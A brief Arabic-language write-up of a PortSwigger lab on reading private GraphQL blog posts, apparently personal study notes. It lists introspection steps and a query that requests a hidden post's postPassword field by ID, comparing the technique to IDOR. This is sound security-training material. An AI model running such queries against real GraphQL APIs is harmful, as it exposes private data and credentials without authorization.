# Lab : Accessing private GraphQL posts

https://portswigger.net/web-security/graphql/lab-graphql-reading-private-posts

- الفكره من الLab ده ان في صفحات مخفيه فيها بيانات حساسه احنا عاوزنها  هنخليها تظهر عنطريق ان انا استدعيها ذي شغره الIDOR

```bash
1. GraphQL > Set introspection query

2. GraphQL > Set legacy introspection query

3. query {
  getBlogPost(id: 3) {
    id
    title
    isPrivate
    postPassword
    summary
  }
}
```
